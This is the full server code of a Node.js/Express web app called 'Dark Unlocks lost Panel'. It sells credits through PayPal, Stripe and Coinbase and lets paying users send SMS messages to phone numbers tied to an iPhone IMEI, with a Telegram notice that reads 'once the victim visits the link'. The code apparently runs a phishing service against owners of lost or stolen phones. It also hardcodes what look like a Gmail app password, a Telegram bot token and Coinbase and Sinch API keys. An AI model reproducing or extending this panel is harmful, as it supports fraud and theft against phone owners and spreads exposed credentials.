require('dotenv').config()
const express = require('express')
const ejs = require('ejs')
const bodyParser = require('body-parser')
const mongoose = require('mongoose')
const session = require('express-session')
const passportLocalMongoose = require('passport-local-mongoose')
const passport = require('passport')
const flash = require('connect-flash');
const paypal = require('paypal-rest-sdk')
const nodemailer = require('nodemailer');
const crypto = require('crypto');
const bcrypt = require('bcrypt');
const CoinbaseCommerce = require('coinbase-commerce-node');
const axios = require('axios');
const Client = CoinbaseCommerce.Client;
const Charge = CoinbaseCommerce.resources.Charge;
const TelegramBot = require('node-telegram-bot-api');
const PORT = process.env.PORT || 3000



paypal.configure({
    mode: 'live', 
    client_id:  process.env.PAYPAL_CLIENT_ID ,
    client_secret: process.env.PAYPAL_SECRET_KEY
})

//stripe api credentials
const PUBLISHABLE_KEY = process.env.STRIPE_PUBLISH_KEY
const SECRET_KEY = process.env.STRIPE_SECRET_KEY
const stripe  = require('stripe')(SECRET_KEY)


const app = express()

//mongoose.connect('mongodb://localhost:27017/LostPanelDB')
mongoose.connect(process.env.DATABASE_URL)

app.use(express.static('public'))
app.set('view engine','ejs')
app.use(bodyParser.urlencoded({extended:true}))
app.use(bodyParser.json())

app.use(session({
    secret:process.env.SECRET,
    resave:false,
    saveUninitialized:false
}))
app.use(passport.initialize())
app.use(passport.session())
app.use(flash());

const userSchema = new mongoose.Schema({
    username: String,
    password: String,
    name: String,
    balance: {
        type: Number,
        default: 0,
    },
    telegramId:String,
    sms: {
        type: Number,
        default: 0,
    },
    resetPasswordToken: String,
    resetPasswordExpires: Date,
    orders: [{
        imei: String,
        model: String,
        phoneNumber: String, 
        status: {
            type: Boolean,
            default: false,
        },
        orderID:{
            type:String,
            default:null 
        },
        date: {
            type: mongoose.Schema.Types.Mixed, // Use Mixed type to allow flexibility
            default: () => {
                const date = new Date();
                const hours = date.getHours().toString().padStart(2, '0');
                const minutes = date.getMinutes().toString().padStart(2, '0');
                return `${hours}:${minutes}`;
            }
        }
    }]
        
    
});

userSchema.plugin(passportLocalMongoose)



const User = new mongoose.model('User',userSchema)

passport.use(User.createStrategy())
passport.serializeUser((user, done) => {
    done(null, user.id);
});

passport.deserializeUser((id, done) => {
    User.findById(id, (err, user) => {
        done(err, user);
    });
});

function ensureAuthenticated(req, res, next) {
    if (req.isAuthenticated()) {
        return next();
    }
    
    res.redirect('/');
}

//Get Routes
app.get('/',(req,res)=>{
    const errorMessage = req.flash('error')[0];

    res.render('home', { errorMessage })
})
app.get('/register',(req,res)=>{

    res.render('register')
})
app.get('/dash',ensureAuthenticated,async(req,res)=>{

const user = req.user

const userId = req.user.id; 

  const users = await User.findById(userId);
  
  if (!user) {
    console.log('User not found');
    return;
  }

  // Calculate total number of orders
  const totalOrders = users.orders.length;
// Check for the success query parameter in the URL
const successMessage = req.query.success === 'true' ? 'Profile updated successfully' : null;
const welcomeMessage = req.query.success === 'true' ? `${user.name}, welcome to Dark Unlocks lost Panel` : null;
    if(req.isAuthenticated()){
        res.render('dash',{user,totalOrders,successMessage,welcomeMessage})
    }else{
        res.redirect('/')
    }
})
app.get('/order',ensureAuthenticated, (req,res)=>{
    res.render('order')
})
app.get('/view-orders',ensureAuthenticated,(req,res)=>{
    const user = req.user
    res.render("view-orders",{user})
})
app.get('/buy-credits',ensureAuthenticated,(req,res)=>{
    const user = req.user

    res.render("buy-credits",{user})
})
app.get('/logout',(req,res)=>{
    req.logout((err)=>{
        if(err){
            console.log(err)
            res.redirect('/dash')
        }else{
            res.redirect('/')
        }
    })
})
app.get('/support', ensureAuthenticated,(req,res)=>{
    const user = req.user
    res.render('support',{user})
})
app.get('/forgot-password', (req, res) => {
    res.render('forgot-password'); 
  });
  
app.get('/reset/:token', (req, res) => {
    const token = req.params.token;
  
    // Find user by the reset token and check if it's still valid
    User.findOne({
      resetPasswordToken: token,
      resetPasswordExpires: { $gt: Date.now() },
    }, (err, user) => {
      if (err || !user) {
        return res.render('error', { message: 'Invalid or expired token' });
      }
  
      // Render a form to reset the password
      res.render('reset', { token });
    });
  });
app.get('/profile',ensureAuthenticated,(req,res)=>{
    const user = req.user
    res.render('profile',{user})
})


//Post Routes
app.post('/crypto',ensureAuthenticated,(req,res)=>{
    amount = parseFloat(req.body.amount);
    console.log(amount)  
   


const apiKey = '290b5828-1f99-4866-aeb3-f6a35c1aac58'; // Replace with your actual API key

const data = {
  name: 'Dark unlocks Credits',
  description: 'buying credits',
  pricing_type: 'fixed_price',
  local_price: {
    amount:amount,
    currency: 'USD',
  },
  redirect_url: 'http://localhost:3000/payment_success', //fix this tomorrow
  cancel_url: 'http://localhost:3000/payment_error',
  metadata: {
    customer_name: req.user.name, // Assuming req.user contains user information
    customer_id: req.user.id,
  },
};

const config = {
  method: 'post',
  url: 'https://api.commerce.coinbase.com/charges', // Ensure this endpoint is correct
  headers: {
    'Content-Type': 'application/json',
    'Accept': 'application/json',
    'X-CC-Api-Key': apiKey, // Add your API key here
  },
  data: JSON.stringify(data),
};

axios(config)
  .then((response) => {
    console.log("sucess")
    const hostedURL = response.data.data.hosted_url;
    // Redirect the user to the hosted URL for payment
    res.redirect(hostedURL);
  })
  .catch((error) => {
    console.log(error);
    // Handle error scenarios appropriately
    res.redirect('/payment_error');
  });

    
})

app.post('/profile', ensureAuthenticated, async (req, res) => {
  const { name, username,chatid } = req.body;
  const userId = req.user.id;

  try {
    const user = await User.findById(userId);

    if (!user) {
      return res.status(404).send("User not found");
    }

    // Update user properties
    user.name = name;
    user.username = username;
    user.telegramId = chatid;

    await user.save();
    console.log("User updated");

    return res.redirect(`/dash?success=true`);

  } catch (error) {
    console.error(error);
    return res.status(500).send("Error updating user");
  }
});

  
app.post('/reset/:token', async (req, res) => {
    const token = req.params.token;
    const newPassword = req.body.password; // Assuming password is sent in request body
  
    try {
      // Find user by the reset token and check if it's still valid
      const user = await User.findOne({
        resetPasswordToken: token,
        resetPasswordExpires: { $gt: Date.now() },
      });
  
      if (!user) {
        return res.render('error', { message: 'Invalid or expired token' });
      }
  
      console.log('new password ',newPassword)
      // Use setPassword to update the user's password
      user.setPassword(newPassword, async () => {
        try {
          await user.save();
  
          // Reset token and expiration after password change
          user.resetPasswordToken = undefined;
          user.resetPasswordExpires = undefined;
          await user.save();
  
          // Password updated successfully, render a success view
          return res.render('password-reset-success');
        } catch (error) {
          console.error('Error resetting password:', error);
          return res.render('error', { message: 'Error resetting password' });
        }
      });
    } catch (error) {
      console.error('Error finding user:', error);
      return res.render('error', { message: 'Error finding user' });
    }
  });
  
// Create a transporter object using your email credentials
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: "darkunlocks1@gmail.com",
        pass: "nnzw lyec ivtj soyw"
    }
});

app.post('/forgot-password', (req, res) => {
    crypto.randomBytes(20, (err, buf) => {
      if (err) throw err;
  
      const token = buf.toString('hex');
      const username = req.body.email; // Assuming this is obtained from the request body
  
      User.findOne({ username }, (err, user) => {
        if (err || !user) {
          return res.render('error', { message: 'User not found' });
        }
  
        user.resetPasswordToken = token;
        user.resetPasswordExpires = Date.now() + 3600000;
  
        user.save((err) => {
          if (err) throw err;
  
     
        const resetLink = `https://lostdarkunlocks.onrender.com/reset/${token}`;

          transporter.sendMail({
            to: username,
            subject: 'Password Reset',
            html: `You can reset your password <a href="${resetLink}">here</a>.`,
          }, (err) => {
            if (err) {
              return res.render('error', { message: 'Error sending reset email' });
            }
            res.render('success-reset', { message: 'Email sent' });
          });
        });
      });
    });
  });
  

app.post('/support', ensureAuthenticated,(req,res)=>{

    const {name,email,message1} = req.body
    const user = req.user
    console.log(name,email,message1)

   async function sendSupportSMS(){

        // Send a confirmation email to the user
        
        const subject = `New email enquired received from your website by ${email}`;
        const message = message1;

        // Create a transporter object using your email credentials
        const transporter = nodemailer.createTransport({
            service: 'gmail',
            auth: {
                user: "darkunlocks1@gmail.com",
                pass: "nnzw lyec ivtj soyw"
            }
        });

        // Create and send the email notification
        const mailOptions = {
            from: 'darkunlocks1@gmail.com',
            to: 'strongadas009@gmail.com',
            subject: subject,
            text: message,
        };

        const info = await transporter.sendMail(mailOptions);
        console.log('Email notification sent:', info.response);
    }
    async function sendSupportUser(){

        // Send a confirmation email to the user
        
        const subject = `Dear ${name}, thank for Contacting Dark unlocks `;
        const message = `${name}, Our team Dark unlocks has recieved your email, please be patiente will get back to you within 24 hours thank you.`;

        // Create a transporter object using your email credentials
        const transporter = nodemailer.createTransport({
            service: 'gmail',
            auth: {
                user: "darkunlocks1@gmail.com",
                pass: "nnzw lyec ivtj soyw"
            }
        });

        // Create and send the email notification
        const mailOptions = {
            from: 'darkunlocks1@gmail.com',
            to: email,
            subject: subject,
            text: message,
        };

        const info = await transporter.sendMail(mailOptions);
        console.log('Email notification sent:', info.response);
    }

    sendSupportSMS()
    sendSupportUser()
    res.redirect("dash")
})

const botToken = '6518093800:AAErTtdV6RIN6VVMSNL5sVQis_T5BOpx8oQ';
const bot = new TelegramBot(botToken, { polling: true });
app.post('/order',ensureAuthenticated,async(req,res)=>{
   
    const message = req.body.message;
    const phoneNumber = req.body.phoneNumber;
    const imei = req.body.imei;
    const selectedModel = req.body.iphoneModel; 
    console.log('Received Phone Number:', phoneNumber);
    console.log(selectedModel)

   

    // Fetch the authenticated user
    const currentUser = await User.findById(req.user._id);
    let orderIdCounter = Math.floor(Math.random() * 10000); // Adjust the range of random numbers as needed

    if( currentUser.sms <= 0 ){
       return res.render("no-credits")
    }


    function generateOrderId() {
    const orderId = `#OFF${orderIdCounter}`;
    orderIdCounter++;
    return orderId;
    }

        // Usage
     const newOrderId = generateOrderId();
        console.log(newOrderId); // Outputs something like OFF1
    // Get the current timestamp
    const timestamp = Date.now();

    // Apply the logic for formatting the date
    const date = new Date(timestamp);
    const currentDate = new Date();
    const diffInMilliseconds = currentDate - date;

let formattedDate;
if (diffInMilliseconds < 24 * 60 * 60 * 1000) {
    // Less than 24 hours ago, display only hour and minute
    const hours = date.getHours().toString().padStart(2, '0');
    const minutes = date.getMinutes().toString().padStart(2, '0');
    formattedDate = `${hours}:${minutes}`;
} else {
    // More than 24 hours ago, display day/month/year and hour:minute
    const options = {
        year: 'numeric',
        month: 'numeric',
        day: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        hour12: false
    };
    formattedDate = date.toLocaleString('en-US', options);
}
console.log(formattedDate)

        const newOrder = {
            imei: imei,
            phoneNumber: phoneNumber,
            status: true,
            message: message,
            model:selectedModel,
            orderID:newOrderId,
            date:formattedDate
        };
    
    // Push the new order to the user's orders array
     currentUser.orders.push(newOrder);
     const newSms = currentUser.sms - 2;
     const newBalance = currentUser.balance - 2;
    currentUser.sms = newSms;
    currentUser.balance = newBalance;
    const message1 = `Order Confirmation\nOrderID: ${generateOrderId()}\nModel: ${selectedModel}\nIMEI: ${imei}\nPhone Number: ${phoneNumber}\n\n\nWill get back to you once the victim visits the link`;

    const groupId = req.user.telegramId; 


    bot.sendMessage(groupId, message1)
    .then(() => {
      console.log('Message sent to group!');
    })
    .catch((err) => {
      console.error('Error sending message:', err);
      rconsole.log('Error sending message');
    });


// Set webhook for updates (optional, if not using polling)
// bot.setWebHook('YOUR_WEBHOOK_URL');

// Error handling
bot.on('polling_error', (error) => {
  console.error('Polling error:', error);
});

try {

    import('node-fetch').then((fetchModule) => {
        const fetch = fetchModule.default;
    
        const SERVICE_PLAN_ID = '73f53d6a750143689cbf681f230db44c';
        const API_TOKEN = '8c028bbcf4f942f89f506bc2ffda3c76';
        const SINCH_NUMBER = '447520651605';
        const TO_NUMBER = phoneNumber;
    
        async function run() {
            const resp = await fetch(
                `https://us.sms.api.sinch.com/xms/v1/${SERVICE_PLAN_ID}/batches`,
                {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        Authorization: `Bearer ${API_TOKEN}`
                    },
                    body: JSON.stringify({
                        from: SINCH_NUMBER,
                        to: [TO_NUMBER],
                        body: message
                    })
                }
            );
            
            
           
              // Save the updated user object back to the database
             await currentUser.save();
             console.log(currentUser)
            
            const data = await resp.json();
            console.log(data);
        }
    
        
        run();
        res.render('success-order',{newOrder,newOrderId})
    }).catch((err) => {
        console.error('Error importing node-fetch:', err);
    
});
    
} catch (err) {
    console.error('Error saving order:', err);
    res.status(500).send('Error saving order');
}

})


//paypal payment
let amount ;
let totalAmount = {}

app.post('/paypal', ensureAuthenticated, (req, res) => {
    // Parse the amount from the request body
     amount = parseFloat(req.body.amount);
    console.log(amount)     

    // Check if the amount is a valid number
    if (isNaN(amount) || amount <= 0) {
        return res.status(400).send('Invalid amount');
    }

    // Construct the amount object
     totalAmount = {
        currency: 'USD',
        total: amount.toFixed(2) // Format total as a string with two decimal places
    };

    // Construct the payment request
    const paymentRequest = {
        intent: 'sale',
        payer: {
            payment_method: 'paypal'
        },
        redirect_urls: {
            return_url: 'https://lostdarkunlocks.onrender.com/payment_success',
            cancel_url: 'https://lostdarkunlocks.onrender.com//payment_error'
        },
        transactions: [{
            item_list: {
                items: [{
                    name: 'Credits',
                    sku: 'credits',
                    price: totalAmount.total,
                    currency: totalAmount.currency,
                    quantity: 1
                }]
            },
            amount: totalAmount,
            description: 'Buying credits'
        }]
    };

    // Create the payment
    paypal.payment.create(paymentRequest, (error, payment) => {

        if (error) {
            console.error('Error occurred while creating payment:', error);
            return res.status(500).send('Internal Server Error');
        }

        // Redirect to PayPal approval URL
        const approvalUrl = payment.links.find(link => link.rel === 'approval_url');

        if (!approvalUrl) {
            console.error('Approval URL not found in the PayPal response.');
            return res.status(500).send('Internal Server Error');
        }
        console.log('Payment created sucessfully')
        res.redirect(approvalUrl.href);
    });
});
app.get('/payment_success', async (req, res) => {
    const payerId = req.query.PayerID;
    const paymentId = req.query.paymentId;
    const userId = req.user._id;

    // Check if payerId, paymentId, and userId are valid
    if (!payerId || !paymentId || !userId) {
        console.error("Invalid parameters.");
        return res.redirect('/payment_cancel');
    }

    const execute_payment_json = {
        "payer_id": payerId,
        "transactions": [{
            "amount": totalAmount
        }]
    };

    console.log("payerId:", payerId);
    console.log("amount:", totalAmount);

    paypal.payment.execute(paymentId, execute_payment_json, async (err, payment) => {
        if (err) {
            console.error(err.response);
            return res.redirect('/payment_error');

        } else {

            console.log("Payment successful");
            console.log(JSON.stringify(payment));

            try {
                // Retrieve the user by their ID
                const user = await User.findById(userId);

                if (!user) {
                    console.error("User not found.");
                    return res.redirect('/payment_error');
                }

                // Calculate the updated balance by adding the payment amount to the current balance
                
                console.log("total amount while updating :", amount)
                const updatedBalance = user.balance + amount;
                const updatedSms = user.sms + amount / 2

                console.log('New balance:', updatedBalance);
                console.log('New Sms:', updatedSms);

                // Update the user's balance in the database
                await User.findByIdAndUpdate(userId, { balance: updatedBalance,sms:updatedSms });

                // Format the date and time
                const currentTimestamp = Date.now();
                const currentDate = new Date(currentTimestamp);

                const formattedDateTime = currentDate.toLocaleString('en-US', {
                    year: 'numeric',
                    month: 'long',
                    day: 'numeric',
                    hour: 'numeric',
                    minute: '2-digit',
                    timeZoneName: 'short'
                });

                // Send a confirmation email to the user
                const userEmail = req.user.username; // Assuming you have the user's email address
                const subject = 'New payment received from your website';
                const message = `A new user ${userEmail} has added $${amount} credits`;

                // Create a transporter object using your email credentials
                const transporter = nodemailer.createTransport({
                    service: 'gmail',
                    auth: {
                        user: "darkunlocks1@gmail.com",
                        pass: "nnzw lyec ivtj soyw"
                    }
                });

                // Create and send the email notification
                const mailOptions = {
                    from: 'darkunlocks1@gmail.com',
                    to: 'strongadas009@gmail.com',
                    subject: subject,
                    text: message,
                };

                const info = await transporter.sendMail(mailOptions);
                console.log('Email notification sent:', info.response);

                // Render the success page with the updated balance
                res.render("success", { amount: amount, paymentId, formattedDateTime, balance: updatedBalance });
            } catch (error) {
                console.error('Error occurred while processing user or sending email:', error);
                res.redirect('/payment_error');
            }
        }
    });
});

//stripe payment
let due;
let amountInCents;
app.post('/visa',ensureAuthenticated,(req,res)=>{
    const user = req.user
    due = parseFloat(req.body.amount)

    function convertDollarsToCents(amountInDollars) {
        // Convert the dollar amount to cents
        let amountInCents = Math.round(amountInDollars * 100); // Round to handle decimal precision issues
      
        return amountInCents;
      }
      
    
      amountInCents = convertDollarsToCents(due);
      console.log(amountInCents); // Output: 1000 (represents $10 in cents)
      
      
      
    console.log(due)

    res.render('visa',{user ,key:PUBLISHABLE_KEY, due,amountInCents})
  })

  app.get('/visa', ensureAuthenticated, async(req, res) => {

    console.log(req.query.amount, typeof req.query.amount);
    console.log("email:", req.query.stripeEmail);
    console.log("strip:", req.query.stripeToken);

    stripe.customers.create({
        email: req.query.stripeEmail,
        source: req.query.stripeToken,
        name: req.user.name,
        address: {
            line1: '1155 South Street',
            postal_code: "0002",
            city: 'Pretoria',
            state: 'Gauteng',
            country: 'South Africa'
        }
    }, (err, customer) => {
        if (err) {
            console.error(err);
            return res.redirect('/payment_error');
        }
        
        console.log(customer);
        
        stripe.charges.create({
            amount: amountInCents,
            description: "Buying crdits on dark unlocks lost panel",
            currency: 'USD',
            customer: customer.id,
        }, async(err, charge) => {
            if (err) {
                console.error(err);
                return res.send(err);
            }
            
        console.log(charge);
        const userId = req.user._id
            // Retrieve the user by their ID
        const user = await User.findById(userId);

        if (!user) {
            console.error("User not found.");
            return res.redirect('/payment_error');
        }

        // Determine the new contract based on the amount
        console.log(amountInCents)
         amount = due


        // Update user's contract and totalSpent
        user.balance = user.balance + due;
        user.sms = user.sms + due /2
        
        
    
        // Save the updated user
        await user.save();

        // Send confirmation email to the user
        
        res.render("payment_success", { user, amount,due });
        });
    });
});

app.get('/payment_error', ensureAuthenticated,(req, res) => {
    const paymentStatus = req.query.status; // Get the payment status query parameter
    console.log("payment ",paymentStatus)
    // Render the 'cancelled' view with the payment status
    res.render('cancelled');
});

app.post('/register',(req,res)=>{

    const { username, password, name } = req.body;

    const newUser = new User({ username, name });

    
    // Use Passport's register method to add the user to the database
    User.register(newUser, password, (err, user) => {
        if (err) {
            console.log(err);
            res.redirect('/');
            
        } else {
            
            passport.authenticate('local')(req, res, () => {
                res.redirect('/dash?welcomeMessage');
                console.log(req.body)
                

            });
        }
    });
})

app.post('/', passport.authenticate('local', {
    successRedirect: '/dash', // Redirect to '/dash' upon successful login
    failureRedirect: '/',      // Redirect to '/' if authentication fails
    failureFlash: true         // Enable flash messages for failed authentication
}));



app.listen(PORT,()=>{
    console.log(`Server is running on port ${PORT}`)
})